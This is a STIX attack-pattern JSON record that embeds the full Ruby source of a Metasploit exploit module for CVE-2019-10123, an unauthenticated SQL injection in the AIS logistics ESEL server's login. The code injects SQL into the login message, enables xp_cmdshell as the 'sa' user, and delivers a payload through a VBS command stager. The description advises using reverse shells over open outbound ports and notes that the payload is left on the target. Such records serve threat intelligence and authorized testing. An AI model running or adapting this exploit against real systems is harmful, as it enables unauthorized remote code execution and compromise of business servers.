{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c06d728b-068e-4a77-b7fd-04e325912d46",
    "created": "2024-08-14T16:45:53.375986Z",
    "modified": "2024-08-14T16:45:53.37599Z",
    "name": "AIS logistics ESEL-Server Unauth SQL Injection RCE",
    "description": " This module will execute an arbitrary payload on an \"ESEL\" server used by the AIS logistic software. The server typically listens on port 5099 without TLS. There could also be server listening on 5100 with TLS but the port 5099 is usually always open. The login process is vulnerable to an SQL Injection. Usually a MSSQL Server with the 'sa' user is in place.  This module was verified on version 67 but it should also run on lower versions. An fixed version was created by AIS in September 2017. However most systems have not been updated.  In regard to the payload, unless there is a closed port in the web server you dont want to use any \"bind\" payload. You want a \"reverse\" payload probably to your port 80 or to any other outbound port allowed on the firewall.  Currently, one delivery method is supported  This method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable. By default the Command Stager uses 'wcsript.exe' to generate the executable on the target.  NOTE: This module will leave a payload executable on the target system when the attack is finished. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ais_esel_server_rce.rb",
            "external_id": "ais_esel_server_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-10123"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MSSQL_COMMANDS\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AIS logistics ESEL-Server Unauth SQL Injection RCE',\n        'Description' => %q{\n          This module will execute an arbitrary payload on an \"ESEL\" server used by the\n          AIS logistic software. The server typically listens on port 5099 without TLS.\n          There could also be server listening on 5100 with TLS but the port 5099 is\n          usually always open.\n          The login process is vulnerable to an SQL Injection. Usually a MSSQL Server\n          with the 'sa' user is in place.\n\n          This module was verified on version 67 but it should also run on lower versions.\n          An fixed version was created by AIS in September 2017. However most systems\n          have not been updated.\n\n          In regard to the payload, unless there is a closed port in the web server,\n          you dont want to use any \"bind\" payload. You want a \"reverse\" payload,\n          probably to your port 80 or to any other outbound port allowed on the firewall.\n\n          Currently, one delivery method is supported\n\n          This method takes advantage of the Command Stager subsystem. This allows using\n          various techniques, such as using a TFTP server, to send the executable. By default\n          the Command Stager uses 'wcsript.exe' to generate the executable on the target.\n\n          NOTE: This module will leave a payload executable on the target system when the\n          attack is finished.\n        },\n        'Author' =>\n          [\n            'Manuel Feifel'\n          ],\n        'License' => MSF_LICENSE,\n        'References' =>\n          [\n            ['CVE', '2019-10123'],\n          ],\n        'Platform' => 'win',\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Payload' =>\n          {\n            'BadChars' => \"\\x00\\xff\\x27\"\n          },\n        'Targets' =>\n          [\n            [ 'Automatic', {} ],\n          ],\n        'CmdStagerFlavor' => 'vbs',\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2019-03-27',\n        'DefaultOptions' =>\n          {\n            'RPORT' => 5099\n          }\n      )\n    )\n  end\n\n  # This is method required for the CmdStager to work...\n  def execute_command(cmd, _opts)\n    cmd_xp = \"EXEC master..xp_cmdshell '#{cmd}'\"\n    send_login_msg(create_login_msg_sql(cmd_xp))\n  end\n\n  # prepends the required length to the message and sends it to the server\n  def send_login_msg(login_msg, check_response = true)\n    length = login_msg.length\n    length += length.to_s.length\n    login_msg = \"#{length}#{login_msg}\"\n\n    connect\n\n    sock.put(login_msg)\n    response = sock.recv(10000)\n\n    if check_response\n      if (response.include? 'Zugangsdaten Falsch') && (response.length > (length - 20))\n        print_good('Correct response received => Data send successfully')\n      else\n        print_warning('Wrong response received => Probably data could not be sent successfully')\n      end\n    end\n\n    return response\n  ensure\n    # Every time a new Connection is required\n    disconnect\n  end\n\n  # embeds a sql command into the login message\n  def create_login_msg_sql(sql_cmd)\n    return create_login_msg(\"#{rand(1_000..9_999)}'; #{sql_cmd}--\")\n  end\n\n  # create a plain login message\n  def create_login_msg(pw)\n    delim = \"\\xFF\"\n    login_str = \"#{delim}000000#{delim}20180810213226#{delim}01#{delim}60\"\\\n                \"#{delim}02#{delim}1111#{delim}#{pw}#{delim}AAAAA#{delim}120\"\n\n  end\n\n  def check\n    int = rand(1..1_000)\n    response_bypass = send_login_msg(create_login_msg(\"#{rand(1_000..9_999)}' OR #{int}=#{int}--\"), false)\n    if response_bypass.include? 'Zugangsdaten OK'\n      CheckCode::Vulnerable\n    else\n      print_status(\"Response was: #{response_bypass}\")\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    # enable xp cmdshell, used to execute commands later\n    # Software uses the 'sa' user by default\n    send_login_msg(create_login_msg_sql(mssql_xpcmdshell_enable))\n    # The porotocol has no limites on max-data\n    execute_cmdstager({ linemax: 1500 })\n    print_warning('The payload is left on the client in the \\%TEMP\\% Folder of the corresponding user.')\n    print_status('Stager should now be executed.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-27",
    "x_mitre_platforms": [
        "win'"
    ]
}